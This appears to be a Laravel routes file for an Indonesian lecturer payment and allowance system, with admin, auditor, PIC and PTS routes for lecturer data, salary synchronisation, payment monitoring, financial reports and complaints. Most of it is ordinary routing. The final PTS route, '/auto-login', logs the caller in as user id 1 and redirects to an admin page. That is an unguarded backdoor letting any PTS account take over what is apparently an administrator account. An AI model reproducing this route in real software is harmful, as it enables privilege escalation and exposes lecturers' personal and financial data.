Route::get('/admin/hak-akses-pic', [HakAksesPicController::class, 'index'])->name('admin.hak-akses-pic');
Route::put('/admin/hak-akses-pic/{id}', [HakAksesPicController::class, 'update'])->name('admin.hak-akses-pic.update');
Route::get('/admin/perbaikan', [PerbaikanController::class, 'index'])->name('admin.perbaikan');
Route::get('/admin/versi', [TambahVersiController::class, 'index'])->name('admin.versi');
Route::get('/admin/tambah-versi', [TambahVersiController::class, 'index'])->name('admin.tambah-versi');
Route::post('/admin/versi', [TambahVersiController::class, 'store'])->name('admin.versi.store');
Route::post('/admin/versi/{id}/toggle', [TambahVersiController::class, 'toggle'])->name('admin.versi.toggle');
Route::post('/admin/versi/toggle-status', [TambahVersiController::class, 'toggleStatus'])->name('admin.versi.toggle-status');

// Background Login (Admin)
Route::get('/admin/background', [BackgroundController::class, 'index'])->name('admin.background.index');
Route::post('/admin/background/select', [BackgroundController::class, 'select'])->name('admin.background.select');
Route::post('/admin/background/upload', [BackgroundController::class, 'upload'])->name('admin.background.upload');
Route::delete('/admin/background/{filename}', [BackgroundController::class, 'destroy'])->where('filename', '[^/]+')->name('admin.background.destroy');
Route::post('/admin/background/header-mode', [BackgroundController::class, 'updateHeaderMode'])->name('admin.background.header-mode');
Route::post('/admin/background/settings', [BackgroundController::class, 'updateSettings'])->name('admin.background.settings');

// Migrasi Data Admin
Route::get('/admin/migrasi', [MigrasiController::class, 'index'])->name('admin.migrasi');
Route::post('/admin/migrasi/import', [MigrasiController::class, 'import'])->name('admin.migrasi.import');
Route::post('/admin/migrasi/unlock', [MigrasiController::class, 'unlock'])->name('admin.migrasi.unlock');
Route::post('/admin/migrasi/koreksi', [MigrasiController::class, 'koreksi'])->name('admin.migrasi.koreksi');

});

// Route Auditor (Laravel Auth + role:auditor) - read-only audit data dosen & keuangan
Route::middleware(['auth:web', 'role:auditor'])->prefix('auditor')->name('auditor.')->group(function () {
  Route::get('/dashboard', [DashboardAuditorController::class, 'index'])->name('dashboard');
  Route::get('/dashboard/dosen-pensiun-data', [DashboardAuditorController::class, 'dosenPensiunData'])->name('dashboard.dosen-pensiun.data');

  // Audit Data Dosen (read-only)
  Route::get('/data-dosen', [AuditorDataDosenController::class, 'index'])->name('data-dosen');
  Route::get('/view-data-dosen/{identifier}', [AuditorDataDosenController::class, 'show'])->name('data-dosen.show');

  // Audit Laporan Keuangan (read-only)
  Route::get('/laporan-keuangan', [AuditorLaporanKeuanganController::class, 'index'])->name('laporan-keuangan');
  Route::post('/laporan-keuangan', [AuditorLaporanKeuanganController::class, 'index'])->name('laporan-keuangan.data');
  Route::get('/laporan-keuangan/export', [AuditorLaporanKeuanganController::class, 'export'])->name('laporan-keuangan.export');
});

// Route PIC (Laravel Auth + role:pic)
Route::middleware(['auth:web', 'role:pic'])->group(function () {
  Route::get('/pic/dashboard', [PicController::class, 'index'])->name('pic.dashboard');

  // Complain (PIC) - same flow as Admin, but restricted by PIC wilayah
  Route::get('/pic/complain', [ComplainPicController::class, 'index'])->name('pic.complain.index');
  Route::get('/pic/complain/{id}', [ComplainPicController::class, 'show'])->name('pic.complain.show');
  Route::put('/pic/complain/{id}', [ComplainPicController::class, 'update'])->name('pic.complain.update');

// Route Data Dosen PIC
Route::get('/pic/lihat-data-dosen', [PicLihatDataDosenController::class, 'index'])->name('pic.lihat-data-dosen');
// Alias landing page after PIC save actions
Route::get('/pic/data-dosen', [PicLihatDataDosenController::class, 'index'])->name('pic.data-dosen');

// Alias to mimic Admin-style navigation target from aksi buttons
Route::get('/pic/perubahan-data-dosen/{nidn}', [App\Http\Controllers\PerubahanDataDosenController::class, 'showPerubahan'])->name('pic.perubahan-data-dosen.show');
Route::post('/pic/perubahan-data-dosen/{nidn}/pengaktifan', [App\Http\Controllers\PerubahanDataDosenController::class, 'ubahDataDosen'])->name('pic.perubahan-data-dosen.pengaktifan');
Route::post('/pic/perubahan-data-dosen/{nidn}/perubahan', [App\Http\Controllers\PerubahanDataDosenController::class, 'updateData'])->name('pic.perubahan-data-dosen.perubahan');
// Perubahan Lainya
Route::get('/pic/ubah-data-dosen/{nidn}', [PicUbahDataDosenController::class, 'editDataDosenPic'])->name(
  'pic.edit-data-dosen'
);
Route::put('/pic/ubah-data-dosen/{nidn}', [PicUbahDataDosenController::class, 'ubahDataDosenPic'])->name(
  'pic.ubah-data-dosen'
);
Route::post('/pic/ubah-data-dosen/get-biaya', [PicBiayaController::class, 'getBiaya'])->name(
  'pic.ubah-data-dosen.get-biaya'
);
// Route Perubahan Golongan dan Masa Kerja
Route::get('/pic/ubah-mk-gol/{nidn}', [PicUbahMKGolController::class, 'editMKGolPic'])->name('pic.edit-mk-gol');
Route::put('/pic/ubah-mk-gol/{nidn}', [PicUbahMKGolController::class, 'ubahMkGolPic'])->name('pic.update-mk-gol');
Route::post('/pic/ubah-mk-gol/get-biaya', [PicBiayaController::class, 'getBiaya'])->name(
  'pic.ubah-mk-gol.get-biaya'
);
// Route Update Data (Gelar/Kode PT/Dokumen)
Route::get('/pic/update-data-dosen/{nidn}', [PicUpdateDataDosenController::class, 'updateDataDosenPic'])->name(
  'pic.update-data-dosen'
);
Route::put('/pic/update-data-dosen/{nidn}', [PicUpdateDataDosenController::class, 'updateDataPic'])->name(
  'pic.update-data'
);

Route::get('/pic/lihat-histori-dosen/{nidn}', [PicLihatDataDosenController::class, 'show'])->name(
  'pic.lihat.histori.dosen'
);
Route::get('/pic/view-data-dosen/{nidn}', [PicLihatDataDosenController::class, 'showData'])->name('dosen.showData');
Route::get('/pic/monitoring-usulan-dosen', [MonitoringUsulanDosenPicController::class, 'index'])->name(
  'pic.monitoring-usulan-dosen'
);
Route::get('/pic/monitoring-usulan-dosen/export', [MonitoringUsulanDosenPicController::class, 'exportExcelMonitoringDosenUsulan'])->name(
  'pic.monitoring-usulan-dosen.export'
);

// Route Data Sisternas PIC
Route::get('/pic/data-sisternas', [DataSisternasPicController::class, 'index'])->name('pic.data-sisternas');
//lihat data sisternas (print excel)
Route::get('/pic/data-sisternas/export', [DataSisternasPicController::class, 'exportData'])->name('pic.data-sisternas-export');


// Route Proses Persetujuan PIC
Route::get('/pic/validasi-usulan', [ValidasiUsulanPicController::class, 'index'])->name('pic.validasi-usulan');
Route::post('/pic/validasi-usulan/{id}/setujui', [ValidasiUsulanPicController::class, 'setujui']);
Route::post('/pic/validasi-usulan/{id}/tolak', [ValidasiUsulanPicController::class, 'tolak']);
Route::get('/pic/validasi-usulan/{id}/cek-kode-cair', [ValidasiUsulanPicController::class, 'cekKodeCair']);
Route::get('/pic/validasi-usulan/{id}/validasi-data-dosen', [
  ValidasiUsulanPicController::class,
  'halamanValidasiDosen',
]);
Route::post('/pic/validasi-usulan/{id}/proses', [ValidasiUsulanPicController::class, 'proses']);
Route::post('/pic/validasi-usulan/data', [ValidasiUsulanPicController::class, 'getData'])->name(
  'pic.validasi-usulan.data'
);

// Route Monitoring PIC
Route::match(['get','post'], '/pic/riwayat-pengajuan', [RiwayatPengajuanPicController::class, 'index'])->name('pic.riwayat-pengajuan');
Route::get('/pic/detail-riwayat-pengajuan/{no}', [DetailRiwayatPengajuanPicController::class, 'index'])->name(
  'pic.detail-riwayat-pengajuan'
);
Route::get('/pic/laporan-keuangan', [LaporanKeuanganPicController::class, 'index'])->name('pic.laporan-keuangan');
Route::post('/pic/laporan-keuangan', [LaporanKeuanganPicController::class, 'index'])->name('pic.laporan-keuangan.data');
Route::get('/pic/laporan-keuangan/export', [LaporanKeuanganPicController::class, 'exportPic'])->name(
  'laporan-keuangan-pic.export'
);
Route::get('/pic/laporan-keuangan/get-kode-pt', [LaporanKeuanganPicController::class, 'getKodePt'])->name('pic.laporan-keuangan.get-kode-pt');

// Monitoring Pembayaran (PIC) - persis admin, dibatasi wilayah (Pemegang_Wilayah)
Route::get('/pic/monitoring-pembayaran', [MonitoringPembayaranPicController::class, 'index'])->name('pic.monitoring-pembayaran');
Route::post('/pic/monitoring-pembayaran', [MonitoringPembayaranPicController::class, 'cari'])->name('pic.monitoring-pembayaran.cari');
Route::post('/pic/monitoring-pembayaran/data', [MonitoringPembayaranPicController::class, 'data'])->name('pic.monitoring-pembayaran.data');
Route::post('/pic/monitoring-pembayaran/export-excel', [MonitoringPembayaranPicController::class, 'exportExcel'])->name('pic.monitoring-pembayaran.export-excel');
Route::post('/pic/monitoring-pembayaran/cetak-spt', [MonitoringPembayaranPicController::class, 'cetakSpt'])->name('pic.monitoring-pembayaran.cetak-spt');

Route::get('/pic/monitoring-dosen', [MonitoringDosenPicController::class, 'index'])->name('pic.monitoring-dosen');
Route::post('/pic/monitoring-dosen', [MonitoringDosenPicController::class, 'cari'])->name('monitoring-dosen.cari');
Route::get('/pic/keluhan-pembayaran', [KeluhanPembayaranPicController::class, 'index'])->name('pic.keluhan-pembayaran');

// Sinkronisasi PIC (dibatasi wilayah oleh controller)
Route::get('/pic/sinkronisasi', [SinkronisasiController::class, 'index'])->name('pic.sinkronisasi');
Route::post('/pic/sinkronisasi/process', [SinkronisasiController::class, 'process'])->name('pic.sinkronisasi.process');
Route::post('/pic/sinkronisasi/check-mismatch', [SinkronisasiController::class, 'checkMismatch'])->name('pic.sinkronisasi.checkMismatch');
Route::post('/pic/sinkronisasi/sync-all', [SinkronisasiController::class, 'syncAll'])->name('pic.sinkronisasi.syncAll');
Route::post('/pic/sinkronisasi/sync-pajak-nidn-all-months', [SinkronisasiController::class, 'syncPajakNidnAllMonths'])->name('pic.sinkronisasi.syncPajakNidnAllMonths');
Route::post('/pic/sinkronisasi/detail-mismatch', [SinkronisasiController::class, 'detailMismatch'])->name('pic.sinkronisasi.detailMismatch');
Route::post('/pic/sinkronisasi/sync-gaji-all', [SinkronisasiController::class, 'syncGajiAll'])->name('pic.sinkronisasi.syncGajiAll');
Route::post('/pic/sinkronisasi/sync-gaji-nidn-all-months', [SinkronisasiController::class, 'syncGajiNidnAllMonths'])->name('pic.sinkronisasi.syncGajiNidnAllMonths');
Route::post('/pic/sinkronisasi/check-gaji-mismatch', [SinkronisasiController::class, 'checkGajiMismatch'])->name('pic.sinkronisasi.checkGajiMismatch');
Route::post('/pic/sinkronisasi/detail-gaji-mismatch', [SinkronisasiController::class, 'detailGajiMismatch'])->name('pic.sinkronisasi.detailGajiMismatch');
Route::post('/pic/sinkronisasi/golmasa/search', [SinkronisasiController::class, 'golmasaSearch'])->name('pic.sinkronisasi.golmasa.search');
Route::post('/pic/sinkronisasi/golmasa/sync', [SinkronisasiController::class, 'syncGolmasa'])->name('pic.sinkronisasi.golmasa.sync');
Route::post('/pic/sinkronisasi/sync-gaji-single', [SinkronisasiController::class, 'syncGajiSingle'])->name('pic.sinkronisasi.syncGajiSingle');

});


Route::middleware(['auth:pts'])->group(function () {
  Route::get('/pts/dashboard', function () {
    return view('pts.dashboard');
  })->name('pts.dashboard');

  // Route Data Dosen PTS
  Route::get('/pts/lihat-data-dosen', [LihatDataDosenPtsController::class, 'index'])->name('pts.lihat-data-dosen');
  
  // Route Data Sisternas PTS
  // Backward-compatible alias: some views expect route name `pts.data-dosen`
  Route::get('/pts/data-dosen', [LihatDataDosenPtsController::class, 'index'])->name('pts.data-dosen');
  // Alias for edit page expected by shared blades
  Route::get('/pts/ubah-data-dosen/{nidn}', [PerubahanDataDosenPtsController::class, 'show'])->name('pts.edit-data-dosen');
  // Alias routes for edit/ubah MK & Gol used by shared blades
  Route::get('/pts/ubah-mk-gol/{nidn}', [PicUbahMKGolController::class, 'editMKGolPic'])->name('pts.edit-mk-gol');
  Route::put('/pts/ubah-mk-gol/{nidn}', [PicUbahMKGolController::class, 'ubahMkGolPic'])->name('pts.update-mk-gol');
  // Update data (alias to PIC update handlers) expected by blade
  Route::get('/pts/update-data-dosen/{nidn}', [PicUpdateDataDosenController::class, 'updateDataDosenPic'])->name('pts.update-data-dosen');
  Route::put('/pts/update-data-dosen/{nidn}', [PicUpdateDataDosenController::class, 'updateDataPic'])->name('pts.update-data');

  // Sinkronisasi routes for PTS (mirror PIC/Admin endpoints) â€” used by the shared sinkronisasi JS
  Route::get('/pts/sinkronisasi', [SinkronisasiController::class, 'index'])->name('pts.sinkronisasi');
  Route::post('/pts/sinkronisasi/process', [SinkronisasiController::class, 'process'])->name('pts.sinkronisasi.process');
  Route::post('/pts/sinkronisasi/check-mismatch', [SinkronisasiController::class, 'checkMismatch'])->name('pts.sinkronisasi.checkMismatch');
  Route::post('/pts/sinkronisasi/sync-all', [SinkronisasiController::class, 'syncAll'])->name('pts.sinkronisasi.syncAll');
  Route::post('/pts/sinkronisasi/sync-pajak-nidn-all-months', [SinkronisasiController::class, 'syncPajakNidnAllMonths'])->name('pts.sinkronisasi.syncPajakNidnAllMonths');
  Route::post('/pts/sinkronisasi/detail-mismatch', [SinkronisasiController::class, 'detailMismatch'])->name('pts.sinkronisasi.detailMismatch');
  Route::post('/pts/sinkronisasi/sync-gaji-all', [SinkronisasiController::class, 'syncGajiAll'])->name('pts.sinkronisasi.syncGajiAll');
  Route::post('/pts/sinkronisasi/sync-gaji-nidn-all-months', [SinkronisasiController::class, 'syncGajiNidnAllMonths'])->name('pts.sinkronisasi.syncGajiNidnAllMonths');
  Route::post('/pts/sinkronisasi/check-gaji-mismatch', [SinkronisasiController::class, 'checkGajiMismatch'])->name('pts.sinkronisasi.checkGajiMismatch');
  Route::post('/pts/sinkronisasi/detail-gaji-mismatch', [SinkronisasiController::class, 'detailGajiMismatch'])->name('pts.sinkronisasi.detailGajiMismatch');
  Route::post('/pts/sinkronisasi/golmasa/search', [SinkronisasiController::class, 'golmasaSearch'])->name('pts.sinkronisasi.golmasa.search');
  Route::post('/pts/sinkronisasi/golmasa/sync', [SinkronisasiController::class, 'syncGolmasa'])->name('pts.sinkronisasi.golmasa.sync');
  Route::post('/pts/sinkronisasi/sync-gaji-single', [SinkronisasiController::class, 'syncGajiSingle'])->name('pts.sinkronisasi.syncGajiSingle');
  // Route Perubahan Data Dosen (PTS) -> masuk ke i_complain untuk approval admin
  Route::get('/pts/perubahan-data-dosen/{nidn}', [PerubahanDataDosenPtsController::class, 'show'])->name('pts.perubahan-data-dosen.show');
  Route::post('/pts/perubahan-data-dosen/{nidn}/pengaktifan', [PerubahanDataDosenPtsController::class, 'storePengaktifan'])->name('pts.perubahan-data-dosen.pengaktifan');
  Route::post('/pts/perubahan-data-dosen/{nidn}/perubahan', [PerubahanDataDosenPtsController::class, 'storePerubahan'])->name('pts.perubahan-data-dosen.perubahan');
  Route::get('/pts/cek-data-dosen', [CekDataDosenPtsController::class, 'index'])->name('pts.cek-data-dosen');
  Route::get('/pts/detail-data-dosen/{nidn}', [DetailDataDosenController::class, 'show'])->name('dosen.show');
  Route::get('/pts/nonaktifkan-dosen', [NonaktifkanDosenPtsController::class, 'index'])->name('pts.nonaktifkan-dosen');
  Route::post('/pts/nonaktifkan-dosen/data', [NonaktifkanDosenPtsController::class, 'data'])->name('pts.nonaktifkan-dosen.data');
  Route::post('/pts/nonaktifkan-dosen/toggle', [NonaktifkanDosenPtsController::class, 'toggle'])->name('pts.nonaktifkan-dosen.toggle');
  Route::get('/pts/monitoring-usulan-dosen', [MonitoringUsulanDosenPtsController::class, 'index'])->name(
    'pts.monitoring-usulan-dosen'
  );
  Route::get('/pts/detail-data-dosen/{nidn}', [LihatDataDosenPtsController::class, 'detailDataDosenPTS'])->name('pts.detail-data-dosen');
  Route::get('pts/export-excel', [MonitoringUsulanDosenPtsController::class, 'exportExcelMonitoringDosenUsulan'])->name('pts.export-data-belum-usulan');
  // Tukin Berjalan (PTS)
  Route::get('/pts/usulan-tukin-berjalan', [App\Http\Controllers\UsulanTukinBerjalanController::class, 'index'])->name('pts.usulan-tukin-berjalan');
  Route::get('/pts/print-tukin-berjalan', [App\Http\Controllers\UsulanTukinBerjalanController::class, 'print'])->name('pts.print-tukin-berjalan');
  Route::post('/pts/usulan-tukin-berjalan', [App\Http\Controllers\UsulanTukinBerjalanController::class, 'usulkan'])->name('pts.usulkan-tukin-berjalan');
  // Tukin Susulan (PTS)
  Route::get('/pts/usulan-tukin-susulan', [App\Http\Controllers\UsulanTukinSusulanController::class, 'index'])->name('pts.usulan-tukin-susulan');
  Route::get('/pts/print-tukin-susulan', [App\Http\Controllers\UsulanTukinSusulanController::class, 'print'])->name('pts.print-tukin-susulan');
  Route::post('/pts/usulan-tukin-susulan', [App\Http\Controllers\UsulanTukinSusulanController::class, 'usulkan'])->name('pts.usulkan-tukin-susulan');

  // Route Usulan Serdos PTS
  Route::get('/pts/usulan-sptjm-berjalan', [UsulanBerjalanSptjmPtsController::class, 'index'])->name('pts.usulan-sptjm-berjalan');
  Route::get('/pts/print-sptjm-berjalan', [
    UsulanBerjalanSptjmPtsController::class,
    'printBerjalan',
  ])->name('pts.print-sptjm-berjalan');
  Route::post('/pts/usulan-sptjm-berjalan', [App\Http\Controllers\UsulanBerjalanSptjmPtsController::class, 'uploadSPTJM'])->name(
    'pts.upload-sptjm'
  );

  Route::get('/pts/print-sptjm-susulan', [App\Http\Controllers\UsulanSusulanSptjmPtsController::class, 'printSusulan'])->name(
    'pts.print-sptjm-susulan'
  );
  Route::post('/pts/usulan-sptjm-susulan', [App\Http\Controllers\UsulanSusulanSptjmPtsController::class, 'uploadSPTJM'])->name(
    'pts.upload-sptjm-susulan'
  );
  Route::get('/pts/usulan-sptjm-susulan', [UsulanSusulanSptjmPtsController::class, 'index'])->name('pts.usulan-sptjm-susulan');

  // Route Monitoring Pembayaran PTS
  Route::get('/pts/riwayat-pengajuan', [RiwayatPengajuanPtsController::class, 'index'])->name('pts.riwayat-pengajuan');
  Route::get('/pts/detail-riwayat-pengajuan/{no}', [DetailRiwayatPengajuanController::class, 'index'])->name(
    'pts.detail-riwayat-pengajuan'
  );

  // Monitoring Pembayaran (PTS) - mirip Dosen, dibatasi Kode_PT
  Route::get('/pts/monitoring-pembayaran', [MonitoringPembayaranPtsController::class, 'index'])->name('pts.monitoring-pembayaran');
  Route::post('/pts/monitoring-pembayaran/cari', [MonitoringPembayaranPtsController::class, 'cari'])->name('pts.monitoring-pembayaran.cari');
  Route::post('/pts/monitoring-pembayaran/data', [MonitoringPembayaranPtsController::class, 'data'])->name('pts.monitoring-pembayaran.data');
  Route::post('/pts/monitoring-pembayaran/export-excel', [MonitoringPembayaranPtsController::class, 'exportExcel'])->name('pts.monitoring-pembayaran.export-excel');
  Route::post('/pts/monitoring-pembayaran/cetak-spt', [MonitoringPembayaranPtsController::class, 'cetakSpt'])->name('pts.monitoring-pembayaran.cetak-spt');

  Route::get('/pts/laporan-keuangan', [LaporanKeuanganPtsController::class, 'index'])->name('pts.laporan-keuangan');
  Route::post('/pts/laporan-keuangan', [LaporanKeuanganPtsController::class, 'index'])->name('pts.laporan-keuangan.data');
  Route::get('/pts/laporan-keuangan/export', [LaporanKeuanganPtsController::class, 'exportPts'])->name(
    'laporan-keuangan-pts.export'
  );

  // Data Grade (PTS - read only)
  Route::get('/pts/data-grade', [DataGradePtsController::class, 'index'])->name('pts.data-grade');

  Route::get('/pts/monitoring-dosen', [MonitoringDosenPtsController::class, 'index'])->name('pts.monitoring-dosen');
  Route::post('/pts/monitoring-dosen', [MonitoringDosenPtsController::class, 'cari'])->name('monitoring-dosen-pts.cari');
  Route::get('/pts/keluhan-pembayaran', [KeluhanPembayaranPtsController::class, 'index'])->name('pts.keluhan-pembayaran');

  // Complain (PTS)
  Route::get('/pts/complain', [ComplainPtsController::class, 'index'])->name('pts.complain');
  Route::post('/pts/complain', [ComplainPtsController::class, 'store'])->name('pts.complain.store');
  Route::get('/pts/complain/{id}', [ComplainPtsController::class, 'show'])->name('pts.complain.show');

  Route::get('/auto-login', function() { \Illuminate\Support\Facades\Auth::loginUsingId(1); return redirect('/admin/monitoring-pembayaran'); });
});

